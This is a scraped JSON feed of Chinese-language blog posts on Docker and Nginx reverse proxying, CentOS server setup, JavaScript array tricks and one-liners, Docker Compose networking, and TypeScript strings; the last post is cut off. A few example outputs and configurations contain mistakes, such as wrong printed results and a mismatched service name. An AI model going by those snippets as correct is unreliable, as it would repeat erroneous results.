特定目錄或檔案對映到 Container，讓 Container 能讀寫 Host OS 的檔案。\n對 Nginx Container 來說，Reverse Proxy 設定放在 /etc/nginx/conf.d，我選擇在 Host OS 也建立相同路徑並將 Container 的 default.conf 複製出來(指令如下)，修改後在 docker run 加上 -v /etc/nginx/conf.d:/etc/nginx/conf.d 對映回去：\n1 sudo docker cp mynginx:/etc/nginx/conf.d /etc/nginx/conf.d 修改 /etc/nginx/conf.d/default.conf，目前是將進入 Nginx 80 Port 的請求導向 Host OS 5000 Port，但從 Docker Container 存取 Host OS IP 有些眉角，Mac 或 Windows Docker 18.3+ 可用 DNS 名稱 host.docker.internal 指向 Host OS IP，但 Docker for Linux 18.4+ 這招己失效。參考\n省事做法是 docker run 時用 --network host 讓 Container 直接繫結本機 IP 而非 Docker 所屬的隔離網段，如此 default.conf 的 proxy_pass 指向 localhost:5000 即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 server { listen 80; server_name localhost; #charset koi8-r; #access_log /var/log/nginx/host.access.log main; location / { proxy_pass http://localhost:5000; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection keep-alive; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } } 完整啟動指令如下：\n1 sudo docker run --name mynginx -d -v /etc/nginx/conf.d:/etc/nginx/conf.d --network host nginx 從遠端開啟 Chrome 連上 Host OS 的 80 Port，我們已被順利導向 ASP.NET Core 網站，顯示設定成功。\n經過以上練習，我們體驗了從 Docker Hub 下載 Image 建立 Docker Containter 跑 Nginx、用 Dockerfile 將 ASP.NET Core 網站包成 Container、用 Port 映對 Host OS TCP Port 到 Container、使用 -v(\u0026ndash;volume) 映對資料夾讓 Container 讀寫 Host OS 檔案。\n而在實務應用上，相關的 Conatiner 需要組合在一起執行，例如一個 Container 跑網站，一個 Container 跑資料庫，此時可用 docker-compose 簡化管理；另外 Docker 也提供 Bridge 為相關 Container 建立專屬的隔離網段，防止外界接觸到不想對外公開的網路服務，也避免不相干的 Container 彼此干擾\u0026hellip; 這些議題就留待下一篇文章討論。\n","date":"2022-12-06T00:00:00Z","image":"https://live.staticflickr.com/65535/52565101723_e9c2825542_o.png","permalink":"https://wayneblog.ga/2022-12-06/dotnet-core-docker-note-1/","title":"ASP.NET Core Docker 筆記 1 - 初探"},{"content":" 參考網站\nASP.NET Core 內建的 Kestrel 伺服器輕巧但功能陽春，實務上需搭配 Reverse Proxy 對外提供服務，Linux 有兩大 Reverse Proxy 選擇：Apache 及 Nginx，這邊筆記一下使用這幾年如日中天的 Nginx。\n相較於 Apache、lighttpd，Nginx 標榜單一執行緒、記憶耗用少、穩定性高，強調效能取向，在熱門網站間獨霸一方(參考：維基百科)，與強調效能的 ASP.NET Core 搭配，相得益彰。\n以下是我的 CentOS Nginx 安裝設定筆記：\n安裝 Nginx。參考：How To Install Nginx on CentOS 7 1 2 sudo yum install epel-release sudo yum install nginx 發現 CentOS 預設沒裝 telnet 客戶端，檢測查修不便，安裝一下 telnet： 1 sudo yum install telnet 啟動 Nginx 1 sudo systemctl start nginx 啟動後 telnet localhost 80 如有連上就是成功了。如從外部連不上多是防火牆緣故，需額外設定：\n1 2 3 sudo firewall-cmd --permanent --zone=public --add-service=http sudo firewall-cmd --permanent --zone=public --add-service=https sudo firewall-cmd --reload 設好防火牆，從 Windows 開 Chrome 連上 CentOS 主機 80 Port，如果看到 Nginx 歡迎網頁即代表大功告成。\nASP.NET Core 文件有詳細的Nginx 設定教學，做法是直接修改 /etc/nginx/nginx.conf，在 http 區塊加入 server 設定。 但較模組化的做法是為每個站台寫獨立 conf 檔放在 /etc/nginx/conf.d 下。例如：/etc/nginx/conf.d/default.conf\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 server { listen 80; server_name linux.darkblog.net; #測試用的自訂網域名稱 location / { proxy_pass http://localhost:5000; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection keep-alive; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } } 設定完畢先用 sudo nginx -t 測試設定檔有沒有被改壞，若 OK 就執行 sudo nginx -s reload 重新載入。\n試連時我遇到 502 Bad Gateway 錯誤： 1 2 2018/09/24 15:37:53 [crit] 60137#0: *7 connect() to 127.0.0.1:5000 failed (13: Permission denied) while connecting to upstream, client: 192.168.50.159, server: linux.darkblog.net, request: \u0026#34;GET / HTTP/1.1\u0026#34;, upstream: \u0026#34;http://127.0.0.1:5000/\u0026#34;, host: \u0026#34;linux.darkblog.net\u0026#34; 2018/09/24 15:37:53 [error] 60137#0: *7 no live upstreams while connecting to upstream, client: 192.168.50.159, server: linux.darkblog.net, request: \u0026#34;GET /favicon.ico HTTP/1.1\u0026#34;, upstream: \u0026#34;http://localhost/favicon.ico\u0026#34;, host: \u0026#34;linux.darkblog.net\u0026#34;, referrer: \u0026#34;http://linux.darkblog.net/\u0026#34; 爬文是 Security-Enhanced Linux (SELinux) 作祟，它是 RHEL 6.6+/CentOS 6.6+ 新加的安全鎖，需下指令解除封印：\n1 sudo setsebool -P httpd_can_network_connect on 接著要設定 SSL： 有個很威的工具叫 Certbot，可以自動申請、驗證、下載、安裝並定期更新 Let\u0026rsquo;s Enrypt 憑證。但這部分要將網站正式掛上 Internet 才好測試，真實憑證留待未來再玩，我先做一張自發憑證驗證 SSL 功能。\n1 2 3 4 sudo mkdir /etc/ssl/private sudo chmod 700 /etc/ssl/private sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/ssl/private/nginx-selfsigned.key -out /etc/ssl/certs/nginx-selfsigned.crt sudo openssl dhparam -out /etc/ssl/certs/dhparam.pem 2048 建立一個 /var/nginx/conf.d/ssl.conf\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 server { listen 443 http2 ssl; listen [::]:443 http2 ssl; server_name linux.darkblog.net; ssl_certificate /etc/ssl/certs/nginx-selfsigned.crt; ssl_certificate_key /etc/ssl/private/nginx-selfsigned.key; ssl_dhparam /etc/ssl/certs/dhparam.pem; location / { proxy_pass http://localhost:5000; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection keep-alive; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } } 參考：\nHow To Secure Nginx with Let\u0026rsquo;s Encrypt on CentOS 7 NGINX 使用 Let’s Encrypt 免費 SSL 憑證設定 HTTPS 安全加密網頁教學 - G.T.Wang How To Create a Self-Signed SSL Certificate for Nginx on CentOS 7 NLog.config 路徑配合作業系統要改 \u0026quot;/var/log/Darkblog/$/$.log\u0026quot;\n在 Reverse Proxy 模式下 HttpContext.Connection.RemoteIpAddress 會抓到 ::1，而 HttpContext.Connection.RemotePort 則是 5000，並非真實客戶端 IP 及對外 Port。在 Startup.cs 加入 app.UseForwardedHeaders() 可解決問題，但啟用 UseForwardedHeaders() 若未搭配 Reverse Proxy 會有來源 IP 偽造風險，不想冒險也不想針對 IIS / Nginx 調整設定，我想到一招讓程式自動依 OS 決定要不要啟用，一勞永逸：\n1 2 3 4 5 6 7 8 9 10 11 public void Configure(IApplicationBuilder app, IHostingEnvironment env) { //運行於 Linux 時啟用 Reverse Proxy 模式 if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux)) { app.UseForwardedHeaders(new ForwardedHeadersOptions { ForwardedHeaders = ForwardedHeaders.XForwardedFor | ForwardedHeaders.XForwardedProto }); } } 線上主機當然不好每次靠手動輸入 dotnet Blah.dll 啟動網站，ASP.NET Core 文件展示了將程式包成服務的方法。先建立 /etc/systemd/system/kestrel-darkblog.service，內容如下： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 [Unit] Description=Darkblog.Core Server [Service] WorkingDirectory=/var/www/Darkblog ExecStart=/usr/bin/dotnet /var/www/Darkblog/Darkblog.Core.dll Restart=always # Restart service after 10 seconds if the dotnet service crashes: RestartSec=10 SyslogIdentifier=darkblog-core User=www-data Environment=ASPNETCORE_ENVIRONMENT=Production Environment=DOTNET_PRINT_TELEMETRY_MESSAGE=false [Install] WantedBy=multi-user.target 設好 kestrel-darkblog.service 後註冊並啟動服務 1 2 3 sudo systemctl enable kestrel-darkblog.service sudo systemctl start kestrel-darkblog.service sudo systemctl status kestrel-darkblog.service 馬上遇到錯誤：\n1 (code=exited, status=217/USER) Process: 66571 ExecStart=/usr/bin/dotnet /var/www/Darkblog/Darkblog.Core.dll (code=exited, status=1/FAILURE) 原因是服務模式使用 www-data 身分執行，沒有權限存取 ASP.NET Core 網站所在目錄與檔案。這部分我不是很確定做法，找到的解法是用 chown 將 /var/www/Darkblog 目錄的擁有者及群組都設成 www-data，建立 www-data 帳號及群組，並將我的管理帳號也加入 www-data 群組，如此服務可以存取該目錄，而我也有權限部署檔案。(註：) 以下指令建立 www-data 使用者及群組，將 jeffrey 加入群組，並授與 www-data 群組可以寫入：\n1 2 3 4 sudo groupadd www-data sudo useradd -g www-data www-data sudo usermod -a -G www-data jeffrey sudo chmod g+w -R /var/www/Darkblog 有一則小訣竅，以服務方式執行 ASP.NET Core 看不到主控台顯示的錯誤訊息，可改用這個指令來查看： 1 sudo journalctl -fu kestrel-darkblog.service 以上，ASP.NET Core + Nginx on CentOS 執行成功。\n附上 CPU / Memory 使用狀況，這是在開瀏覽器狂按 F5 下的數字，總記憶體 1GB，dotnet CPU 在 5% 以下，RAM 耗用不到 10%，有個 kworker CPU 偏高，爬文與硬碟有關，推測與 Win10 Hyper-V VM 不怎麼的虛擬磁碟效能有點關係。但整體數字讓我很滿意，遷都 CentOS 計劃繼續挺進。\n","date":"2022-12-06T00:00:00Z","image":"https://live.staticflickr.com/65535/52564798549_d9c11f4419_o.png","permalink":"https://wayneblog.ga/2022-12-06/dotnet-nginx-install-on-centos/","title":"在 CentOS 上安裝 ASP.NET Core + Nginx 的筆記"},{"content":" 參考網站\n參考網站\n陣列是 JavaScript 中最常用到的概念之一。處理資料時很常用到這種資料結構。這篇文章介紹一些陣列操作的基本方法，希望對你有幫助！\n從陣列中移除重複項目 很經典的面試問題，需要從陣列中找出獨立值。使用 Set 資料型態，可以輕易完成這任務。這邊介紹兩種方法，一個使用 .from() 一個使用 \u0026hellip; 展開運算子。\n1 2 3 4 5 6 7 8 9 var fruits = [\u0026#34;banana\u0026#34;, \u0026#34;apple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;watermelon\u0026#34;, \u0026#34;apple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;grape\u0026#34;, \u0026#34;apple\u0026#34;]; // First method var uniqueFruits = Array.from(new Set(fruits)); console.log(uniqueFruits); // returns [\u0026#34;banana\u0026#34;, \u0026#34;apple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;watermelon\u0026#34;, \u0026#34;grape\u0026#34;] // Second method var uniqueFruits2 = [...new Set(fruits)]; console.log(uniqueFruits2); // returns [\u0026#34;banana\u0026#34;, \u0026#34;apple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;watermelon\u0026#34;, \u0026#34;grape\u0026#34;] 從陣列中抽換掉某個元素 這個情境也很常見。有一個簡單的好方法，就是使用 .splice ，參數分別是開始修改的位置、修改幾個元素、要更改成哪些值。\n1 2 3 var fruits = [\u0026#34;banana\u0026#34;, \u0026#34;apple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;watermelon\u0026#34;, \u0026#34;apple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;grape\u0026#34;, \u0026#34;apple\u0026#34;]; fruits.splice(0, 2, \u0026#34;potato\u0026#34;, \u0026#34;tomato\u0026#34;); console.log(fruits); // returns [\u0026#34;potato\u0026#34;, \u0026#34;tomato\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;watermelon\u0026#34;, \u0026#34;apple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;grape\u0026#34;, \u0026#34;apple\u0026#34;] 不用 .map() 的 map 功能 .map() 很常用、大家都會用，但有一個方法也很不錯，也很簡潔，就是 .from()。\n1 2 3 4 5 6 7 8 9 10 11 12 var friends = [ { name: \u0026#34;John\u0026#34;, age: 22 }, { name: \u0026#34;Peter\u0026#34;, age: 23 }, { name: \u0026#34;Mark\u0026#34;, age: 24 }, { name: \u0026#34;Maria\u0026#34;, age: 22 }, { name: \u0026#34;Monica\u0026#34;, age: 21 }, { name: \u0026#34;Martha\u0026#34;, age: 19 }, ] var friendsNames = Array.from(friends, ({name}) =\u0026gt; name); console.log(friendsNames); // returns [\u0026#34;John\u0026#34;, \u0026#34;Peter\u0026#34;, \u0026#34;Mark\u0026#34;, \u0026#34;Maria\u0026#34;, \u0026#34;Monica\u0026#34;, \u0026#34;Martha\u0026#34;] 清空陣列 有時候你會需要清空一個陣列。一個一個把元素刪掉太慢了，下面這個方法快多了：直接把長度設為 0 吧！\n1 2 3 4 5 var fruits = [\u0026#34;banana\u0026#34;, \u0026#34;apple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;watermelon\u0026#34;, \u0026#34;apple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;grape\u0026#34;, \u0026#34;apple\u0026#34;]; fruits.length = 0; console.log(fruits); // returns [] 把陣列轉換為物件 有時需要把陣列轉成物件。使用 \u0026hellip; 展開運算子可以很快完成這任務。\n1 2 3 var fruits = [\u0026#34;banana\u0026#34;, \u0026#34;apple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;watermelon\u0026#34;]; var fruitsObj = { ...fruits }; console.log(fruitsObj); // returns {0: \u0026#34;banana\u0026#34;, 1: \u0026#34;apple\u0026#34;, 2: \u0026#34;orange\u0026#34;, 3: \u0026#34;watermelon\u0026#34;, 4: \u0026#34;apple\u0026#34;, 5: \u0026#34;orange\u0026#34;, 6: \u0026#34;grape\u0026#34;, 7: \u0026#34;apple\u0026#34;} 陣列塞滿資料 有時需要把一個陣列塞滿某些資料。使用 .fill() 可以快速完成這任務：\n1 2 var newArray = new Array(10).fill(\u0026#34;1\u0026#34;); console.log(newArray); // returns [\u0026#34;1\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;1\u0026#34;] 合併陣列 老方法是使用 .concat() 來合併。但有個新方法，就是用 \u0026hellip; 展開運算子，非常簡單俐落：\n1 2 3 4 5 var fruits = [\u0026#34;apple\u0026#34;, \u0026#34;banana\u0026#34;, \u0026#34;orange\u0026#34;]; var meat = [\u0026#34;poultry\u0026#34;, \u0026#34;beef\u0026#34;, \u0026#34;fish\u0026#34;]; var vegetables = [\u0026#34;potato\u0026#34;, \u0026#34;tomato\u0026#34;, \u0026#34;cucumber\u0026#34;]; var food = [...fruits, ...meat, ...vegetables]; console.log(food); // [\u0026#34;apple\u0026#34;, \u0026#34;banana\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;poultry\u0026#34;, \u0026#34;beef\u0026#34;, \u0026#34;fish\u0026#34;, \u0026#34;potato\u0026#34;, \u0026#34;tomato\u0026#34;, \u0026#34;cucumber\u0026#34;] 找出陣列交集 這也是 JavaScript 面試最常見的問題。這邊使用 filter 跟 .includes() 來完成這任務。\n1 2 3 4 var numOne = [0, 2, 4, 6, 8, 8]; var numTwo = [1, 2, 3, 4, 5, 6]; var duplicatedValues = [...new Set(numOne)].filter(item =\u0026gt; numTwo.includes(item)); console.log(duplicatedValues); // returns [2, 4, 6] 把 false 相關的值從陣列移除 false 相關值包含 false、0、\u0026quot;\u0026quot;、null、NaN、undefined。\n使用 .filter() 可以俐落地過濾陣列。\n1 2 3 var mixedArr = [0, \u0026#34;blue\u0026#34;, \u0026#34;\u0026#34;, NaN, 9, true, undefined, \u0026#34;white\u0026#34;, false]; var trueArr = mixedArr.filter(Boolean); console.log(trueArr); // returns [\u0026#34;blue\u0026#34;, 9, true, \u0026#34;white\u0026#34;] 從陣列撈出隨機元素 有時需要隨機撈元素出來。根據陣列長度，隨機撈一個索引出來，就可以囉。\n1 2 var colors = [\u0026#34;blue\u0026#34;, \u0026#34;white\u0026#34;, \u0026#34;green\u0026#34;, \u0026#34;navy\u0026#34;, \u0026#34;pink\u0026#34;, \u0026#34;purple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;yellow\u0026#34;, \u0026#34;black\u0026#34;, \u0026#34;brown\u0026#34;]; var randomColor = colors[(Math.floor(Math.random() * (colors.length)))] 逆轉陣列 不需要複雜的迴圈跟函數，也能逆轉一個陣列。這樣一行就可以：\n1 2 3 var colors = [\u0026#34;blue\u0026#34;, \u0026#34;white\u0026#34;, \u0026#34;green\u0026#34;, \u0026#34;navy\u0026#34;, \u0026#34;pink\u0026#34;, \u0026#34;purple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;yellow\u0026#34;, \u0026#34;black\u0026#34;, \u0026#34;brown\u0026#34;]; var reversedColors = colors.reverse(); console.log(reversedColors); // returns [\u0026#34;brown\u0026#34;, \u0026#34;black\u0026#34;, \u0026#34;yellow\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;purple\u0026#34;, \u0026#34;pink\u0026#34;, \u0026#34;navy\u0026#34;, \u0026#34;green\u0026#34;, \u0026#34;white\u0026#34;, \u0026#34;blue\u0026#34;] .lastIndexOf() 方法 這個有趣的方法，可以找到特定元素最後一次出現的索引。如果陣列中有重複值，就可用上這方法。\n1 2 3 var nums = [1, 5, 2, 6, 3, 5, 2, 3, 6, 5, 2, 7]; var lastIndex = nums.lastIndexOf(5); console.log(lastIndex); // returns 9 陣列中全部數值加總 這也是面試常見考題。使用 .reduce 可以快速解決這問題。\n1 2 3 var nums = [1, 5, 2, 6]; var sum = nums.reduce((x, y) =\u0026gt; x + y); console.log(sum); // returns 14 ","date":"2022-12-05T00:00:00Z","image":"https://live.staticflickr.com/65535/52544052174_68e62fb7f8_o.png","permalink":"https://wayneblog.ga/2022-12-05/js-13-useful-array-tricks/","title":"JavaScript 中關於 Array 的 13 個入門小技巧！"},{"content":" 參考網站\n參考網站\n一行程式碼有時可以做到很多事。這邊有七個小任務都用一行就可以完成，給您參考！\n洗亂陣列 在需要將陣列隨機打亂的時候，這行會很好用。\n1 2 3 4 5 const shuffleArray = (arr) =\u0026gt; arr.sort(() =\u0026gt; Math.random() - 0.5); // Testing const arr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]; console.log(shuffleArray(arr)); 複製到剪貼板 在寫網站功能的時候，有時會需要這個功能。\n1 2 3 4 5 const copyToClipboard = (text) =\u0026gt; navigator.clipboard?.writeText \u0026amp;\u0026amp; navigator.clipboard.writeText(text); // Testing copyToClipboard(\u0026#34;Hello World!\u0026#34;); 不重複元素 每種語言都有實作自己的 Hash List，在 JavaScript 中，叫做 Set。可以使用 Set Data Structure 輕鬆地找出不重複元素。\n1 2 3 4 5 const getUnique = (arr) =\u0026gt; [...new Set(arr)]; // Testing const arr = [1, 1, 2, 3, 3, 4, 4, 4, 5, 5]; console.log(getUnique(arr)); 檢測深色模式 深色模式日益流行，如果用戶在他們的設備中啟用了深色模式，最好將您的應用程序也切換到深色模式。\n1 2 3 4 5 6 const isDarkMode = () =\u0026gt; window.matchMedia \u0026amp;\u0026amp; window.matchMedia(\u0026#34;(prefers-color-scheme: dark)\u0026#34;).matches; // Testing console.log(isDarkMode()); 滑到頂部 新手常常發現滑動元素很難做。最簡單的方法是使用 scrollIntoView。\n加上 behavior 可以讓動畫更流暢。\n1 2 const scrollToTop = (element) =\u0026gt; element.scrollIntoView({ behavior: \u0026#34;smooth\u0026#34;, block: \u0026#34;start\u0026#34; }); 滑到底部 一樣使用 scrollIntoView 就可以，只需要將 block 值改成 end。\n1 2 const scrollToBottom = (element) =\u0026gt; element.scrollIntoView({ behavior: \u0026#34;smooth\u0026#34;, block: \u0026#34;end\u0026#34; }); 產生隨機顏色 如果您需要隨機色碼，可以參考這段：\n1 2 const generateRandomHexColor = () =\u0026gt; `#${Math.floor(Math.random() * 0xffffff).toString(16)}`; ","date":"2022-12-05T00:00:00Z","image":"https://live.staticflickr.com/65535/52544218553_b60d2ccdec_o.jpg","permalink":"https://wayneblog.ga/2022-12-05/js-7-killer-one-liners/","title":"一行 JavaScript 就能完成的 7 個小任務！"},{"content":" 參考網站\n在 Docker 中，容器之間的鏈接是一種很常見的操作，它提供了訪問其中的某個容器的網絡服務而不需要將所需的端口暴露給 Docker Host 主機的功能。Docker Compose 中對該特性的支持同樣是很方便的。然而，如果需要鏈接的容器沒有定義在同一個 docker-compose.yml 中的時候，這個時候就稍微麻煩複雜了點。\n不使用 Docker Compose 在不使用Docker Compose的時候，將兩個容器鏈接起來使用—link參數，相對來說比較簡單，以nginx鏡像為例子：\n1 2 docker run --rm --name test1 -d nginx # 開啟一個實例test1 docker run --rm --name test2 --link test1 -d nginx # 開啟一個實例test2並與test1建立鏈接 這樣，test2 與 test1 便建立了鏈接，就可以在 test2 中使用訪問 test1 中的服務了。\n使用Docker Compose 如果使用 Docker Compose，那麼這個事情就更簡單了，還是以上面的 nginx 鏡像為例子，編輯 docker-compose.yml 文件為：\ndocker-compose.yml 1 2 3 4 5 6 7 8 9 10 version: \u0026#34;3\u0026#34; services: test2: image: nginx depends_on: - test1 links: - test1 test1: image: nginx 最終效果與使用普通的 Docker 命令 docker run xxxx 建立的鏈接並無區別。這只是一種最為理想的情況。\n問題 如果容器沒有定義在同一個 docker-compose.yml 文件中，應該如何鏈接它們呢？ 如果定義在 docker-compose.yml 文件中的容器需要與 docker run xxx 啟動的容器鏈接，需要如何處理？ 方法一：讓需要鏈接的容器同屬一個外部網絡 我們還是使用 nginx 鏡像來模擬這樣的一個情景：假設我們需要將兩個使用 Docker Compose 管理的 nignx 容器(test1和test2)鏈接起來，使得 test2 能夠訪問 test1 中提供的服務，這裡我們以能 ping 通為準。\n首先，我們定義容器 test1 的 docker-compose.yml 文件內容為：\ndocker-compose.yml 1 2 3 4 5 6 7 8 9 10 11 version: \u0026#34;3\u0026#34; services: test2: image: nginx container_name: test1 networks: - default - app_net networks: app_net: external: true 容器 test2 內容與 test1 基本一樣，只是多了一個 external_links。\n需要特別說明的是：最近發布的 Docker 版本已經不需要使用 external_links 來鏈接容器，容器的 DNS 服務可以正確的作出判斷，因此如果你你需要兼容較老版本的 Docker 的話，那麼容器 test2 的 docker-compose.yml 文件內容為：\ndocker-compose.yml 1 2 3 4 5 6 7 8 9 10 11 12 13 version: \u0026#34;3\u0026#34; services: test2: image: nginx networks: - default - app_net external_links: - test1 container_name: test2 networks: app_net: external: true 否則的話，test2 的 docker-compose.yml 和 test1 的定義完全一致，不需要額外多指定一個 external_links。相關的問題請參見 stackoverflow 上的相關問題：docker-compose + external container\n正如你看到的那樣，這裡兩個容器的定義裡都使用了同一個外部網絡 app_net，因此，我們需要在啟動這兩個容器之前通過以下命令再創建外部網絡：\n1 docker network create app_net 之後，通過 docker-compose up -d 命令啟動這兩個容器，然後執行 docker exec -it test2 ping test1，你將會看到如下的輸出：\n1 2 3 4 5 6 7 8 $ docker exec -it test2 ping test1 PING test1 (172.18.0.2): 56 data bytes 64 bytes from 172.18.0.2: icmp_seq=0 ttl=64 time=0.091 ms 64 bytes from 172.18.0.2: icmp_seq=1 ttl=64 time=0.146 ms 64 bytes from 172.18.0.2: icmp_seq=2 ttl=64 time=0.150 ms 64 bytes from 172.18.0.2: icmp_seq=3 ttl=64 time=0.145 ms 64 bytes from 172.18.0.2: icmp_seq=4 ttl=64 time=0.126 ms 64 bytes from 172.18.0.2: icmp_seq=5 ttl=64 time=0.147 ms 證明這兩個容器是成功鏈接了，反過來在 test1 中 ping test2 也是能夠正常 ping 通的。\n如果我們通過 docker run --rm --name test3 -d nginx 這種方式來先啟動了一個容器(test3)，並且沒有指定它所屬的外部網絡，而需要將其與 test1 或者 test2 鏈接的話，這個時候手動鏈接外部網絡即可：\n1 docker network connect app_net test3 這樣，三個容器都可以相互訪問了。\n方法二：更改需要鏈接的容器的網絡模式 通過更改你想要相互鏈接的容器的網絡模式為 bridge，並指定需要鏈接的外部容器(external_links)即可。\n與同屬外部網絡的容器可以相互訪問的鏈接方式一不同，這種方式的訪問是單向的。\n還是以 nginx 容器鏡像為例子，如果容器實例 nginx1 需要訪問容器實例 nginx2，那麼 nginx2 的 docker-compose.yml 定義為：\ndocker-compose.yml 1 2 3 4 5 6 version: \u0026#34;3\u0026#34; services: nginx2: image: nginx container_name: nginx2 network_mode: bridge 與其對應的，nginx1 的 docker-compose.yml 定義為：\ndocker-compose.yml 1 2 3 4 5 6 7 8 version: \u0026#34;3\u0026#34; services: nginx1: image: nginx external_links: - nginx2 container_name: nginx1 network_mode: bridge 需要特別說明的是，這裡的 external_links 是不能省略的，而且 nginx1 的啟動必須要在 nginx2 之後，否則可能會報找不到容器 nginx2 的錯誤。\n接著我們使用 ping 來測試下連通性：\n1 2 3 4 5 6 7 8 $ docker exec -it nginx1 ping nginx2 # nginx1 to nginx2 PING nginx2 (172.17.0.4): 56 data bytes 64 bytes from 172.17.0.4: icmp_seq=0 ttl=64 time=0.141 ms 64 bytes from 172.17.0.4: icmp_seq=1 ttl=64 time=0.139 ms 64 bytes from 172.17.0.4: icmp_seq=2 ttl=64 time=0.145 ms $ docker exec -it nginx2 ping nginx1 #nginx2 to nginx1 ping: unknown host 以上也能充分證明這種方式是屬於單向聯通的。\n在實際應用中根據自己的需要靈活的選擇這兩種鏈接方式，如果想偷懶的話，大可選擇第二種。不過我更推薦第一種，不難看出無論是聯通性還是靈活性，較為更改網絡模式的第二種都更為友好。\n","date":"2022-12-04T00:00:00Z","image":"https://live.staticflickr.com/65535/52565233288_251b1a5202_o.jpg","permalink":"https://wayneblog.ga/2022-12-04/docker-compose-link-external-comtainer/","title":"Docker Compose 鏈接外部容器的幾種方式"},{"content":" 參考網站\n參考網站\n參考網站\n參考網站\n背景 與 JavaScript 語言不同的是，TypeScript 使用的是靜態型別(強型別)，比如說它指定了變數可以儲存的資料型別。\n如下圖所示，如果在 JS 中，指定變數可以儲存的資料型別，會報錯：“型別註釋只可以在TS檔案中被使用”：\nTypeScript 是 JavaScript 的超集(superset)，TypeScript 需要編譯(語法轉換)生成 JavaScript 才能被瀏覽器執行，它也區分了 string 和 String 這兩個資料型別。通常來說，string 表示原生型別，而 String 表示物件。\n原生 string JavaScript 在 ES6 標準裡支援6種原生型別，string 是其中之一。\n1 2 3 4 5 6 let testVar1: number = 19; let testVar2: boolean = true; let testVar3: string =\u0026#34;Hi Wayne!\u0026#34;; let testVar4: null = null; let testVar5: undefined = undefined; let testVar6: object = new String(\u0026#34;Wayne Cloud!\u0026#34;); 原生的 string 是不包含屬性的值(即沒有properties)，包括字面上沒有定義型別、字面上定義了 string、字面上定義了 String和一些從 string 函式呼叫返回的 strings 也都可以被歸為原生型別：\n1 2 3 let msg1: string = \u0026#34;Hello world!\u0026#34;; let msg2: string = \u0026#34;Hello world!\u0026#34;; let msg22 = returnStr(); 以上三個變數的型別(typeof())是 string。\n物件 String 物件是不同屬性的累積，一個物件可以呼叫許多相應的方法。\n1 let msg3: String = new String(\u0026#39;Hello world!\u0026#39;); 這個變數 msg3 的型別就是 object：\n1 console.log(typeof(msg3)); // object String 物件支援的方法：\nNo. Method Description 1. charAt() charAt() 方法從一個字符串中返回指定的字符 2. charCodeAt() charCodeAt() 方法返回 0 到 65535 之間的整數，表示給定索引處的 UTF-16 代碼單元 3. concat() concat() 方法將一個或多個字符串與原字符串連接合併，形成一個新的字符串並返回 4. indexOf() indexOf() 方法，給定一個參數：要搜索的子字符串，搜索整個調用字符串，並返回指定子字符串第一次出現的索引。給定第二個參數：一個數字，該方法將返回指定子字符串在大於或等於指定數字的索引處的第一次出現 5. lastIndexOf() lastIndexOf() 方法返回調用 String 對象的指定值最後一次出現的索引，在一個字符串中的指定位置 fromIndex 處從後向前搜索。如果沒找到這個特定值則返回 -1。該方法將從尾到頭地檢索字符串 str，看它是否含有子串 searchValue。開始檢索的位置在字符串的 fromIndex 處或字符串的結尾(沒有指定 fromIndex 時)。如果找到一個 searchValue，則返回 searchValue 的第一個字符在 str 中的位置。 str 中的字符位置是從 0 開始的 6. localeCompare() localeCompare() 方法返回一個數字來指示一個參考字符串是否在排序順序前面或之後或與給定字符串相同。新的 locales 和 options 參數能讓應用程序定制函數的行為，即指定用來排序的語言。 locales 和 options 參數完全取決於實現，在舊的實現中忽略這兩個參數 7. match() match() 方法檢索返回一個字符串匹配正則表達式的結果 8. replace() replace() 方法返回一個由替換值(replacement)替換部分或所有的模式(pattern)匹配項後的新字符串。模式可以是一個字符串或者一個正則表達式，替換值可以是一個字符串或者一個每次匹配都要調用的回調函數。如果 pattern 是字符串，則僅替換第一個匹配項 9. search() search() 方法執行正則表達式和 String 對象之間的一個搜索匹配 10. slice() slice() 方法提取某個字符串的一部分，並返回一個新的字符串，且不會改動原字符串 11. split() split() 方法使用指定的分隔符字符串將一個 String 對象分割成子字符串數組，以一個指定的分割字串來決定每個拆分的位置 12. substr() substr() 方法返回一個字符串中從指定位置開始到指定字符數的字符 13. substring() substring() 方法返回一個字符串在開始索引到結束索引之間的一個子集，或從開始索引直到字符串的末尾的一個子集 14. toLocaleLowerCase() toLocaleLowerCase() 